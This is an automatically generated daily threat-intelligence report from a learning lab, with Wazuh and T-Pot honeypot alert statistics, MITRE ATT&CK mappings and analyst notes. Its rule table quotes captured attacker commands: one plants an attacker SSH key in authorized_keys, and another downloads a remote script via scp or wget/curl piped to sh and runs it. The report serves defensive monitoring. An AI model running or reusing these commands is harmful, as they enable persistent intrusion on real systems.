# LearningLab01 Daily Threat Intelligence Report — 2026-10-27

Generated: 2026-10-27T13:15:05.054Z

Report window: 2026-10-26T13:15:05.023Z through 2026-10-27T13:15:05.023Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 304,855 |
| Attack-related alerts | 74,819 |
| Honeypot interactions | 296,282 |
| Authentication failures | 1,463 |
| Authentication successes | 614 |
| Critical alerts | 375 |
| High alerts | 772 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 375 critical-severity alerts require priority review.
- 772 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 2.38:1.
- Country attribution currently covers only 0.30% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110209: T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk (86,936 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 375 | 0.12% |
| High | 772 | 0.25% |
| Medium | 3,831 | 1.26% |
| Low | 299,877 | 98.37% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 1,463
- Authentication successes: 614
- Failure-to-success ratio: 2.38:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 69,290 | 92.61% |
| Payload delivery | 69,290 | 92.61% |
| Command execution | 2,991 | 4.00% |
| Authentication failure | 1,463 | 1.96% |
| Reconnaissance | 348 | 0.47% |
| Malware | 341 | 0.46% |
| Network scan | 118 | 0.16% |
| SMTP attack | 49 | 0.07% |
| Web attack | 33 | 0.04% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 913 alerts, representing 0.30% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 303,942 | 99.70% | Not geolocated |
| United Kingdom | 302 | 0.10% | ████████████████████ |
| Germany | 204 | 0.07% | ██████████████ |
| Bulgaria | 131 | 0.04% | █████████ |
| Azerbaijan | 93 | 0.03% | ██████ |
| United States | 89 | 0.03% | ██████ |
| Hungary | 64 | 0.02% | ████ |
| Singapore | 13 | 0.00% | █ |
| Canada | 6 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Bosnia and Herzegovina | 2 | 0.00% | █ |
| Kazakhstan | 2 | 0.00% | █ |
| Switzerland | 2 | 0.00% | █ |
| Central African Republic | 1 | 0.00% | █ |
| Panama | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Lateral Movement | 97 |
| Execution | 83 |
| Credential Access | 26 |
| Impact | 11 |
| Command and Control | 9 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 83 |
| Brute Force | 26 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 9 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110209 | 5 | 86,936 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (86,936) |
| 110213 | 4 | 76,607 | T-Pot RDP connection from [IP address] to port 3389. | tpot (76,607) |
| 110205 | 6 | 69,208 | T-Pot Honeytrap received a payload from [IP address] | tpot (69,208) |
| 110207 | 5 | 37,296 | T-Pot SentryPeer SIP activity from [IP address]:20817, method INVITE | tpot (37,296) |
| 110204 | 4 | 21,860 | T-Pot Honeytrap connection from [IP address] to port 5909 | tpot (21,860) |
| 110201 | 4 | 2,974 | T-Pot Dionaea mssqld connection from [IP address] to port 1433 | tpot (2,974) |
| 110104 | 7 | 2,524 | Cowrie captured a command from [IP address]: &k`g&k\|zpkfq)ES[M | tpot (2,524) |
| 110101 | 3 | 2,148 | Cowrie SSH connection from [IP address]. | tpot (2,148) |
| 110102 | 5 | 1,463 | Cowrie failed login from [IP address] using username admin. | tpot (1,463) |
| 110219 | 4 | 649 | T-Pot CiscoASA web activity from [IP address]: "POST /+webvpn+/index.html HTTP/1.1" 200 - | tpot (649) |
| 203 | 9 | 568 | Agent event queue is full. Events may be lost. | tpot (568) |
| 110109 | 13 | 375 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (375) |
| 110103 | 10 | 323 | Cowrie accepted login from [IP address] using username lghkel	. | tpot (323) |
| 110105 | 12 | 249 | Cowrie captured a file download from [IP address]. | tpot (249) |
| 533 | 7 | 194 | Listened ports status (netstat) changed (new port opened or closed). | tpot (194) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 5502 | 3 | 171 | PAM: Login session closed. | tpot (169), wazuh (2) |
| 110221 | 7 | 165 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /SETTINGS.CFG HTTP/1.1" 404 - | tpot (165) |
| 110216 | 4 | 124 | T-Pot Mailoney received SMTP command from [IP address]: EHLO [IP address]  | tpot (124) |
| 110214 | 9 | 108 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (108) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110220 | 8 | 96 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (96) |
| 110108 | 12 | 83 | Cowrie captured suspicious execution or staging activity from [IP address]: >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x44\x45\x4f\x5a\x48' | tpot (83) |
| 110212 | 10 | 82 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (82) |
| 110215 | 4 | 67 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (67) |
| 110217 | 7 | 49 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: AUTH LOGIN  | tpot (49) |
| 202 | 7 | 42 | Agent event queue is 90% full. | tpot (42) |
| 205 | 3 | 42 | Agent event queue is back to normal load. | tpot (42) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110223 | 5 | 33 | T-Pot HoneyAML received  request from  to  on port . | tpot (33) |
| 110106 | 10 | 26 | Cowrie detected repeated failed logins from [IP address]. | tpot (26) |
| 110208 | 7 | 13 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:15693 | tpot (13) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110211 | 9 | 10 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (10) |
| 110107 | 12 | 9 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (9) |
| 110222 | 9 | 3 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (3) |
| 19010 | 3 | 3 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (3) |
| 19011 | 9 | 3 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (3) |
| 110218 | 9 | 2 | T-Pot Mailoney detected repeated SMTP activity from one source. | tpot (2) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 86003 | 3 | 2 | Docker: Error message | tpot (2) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
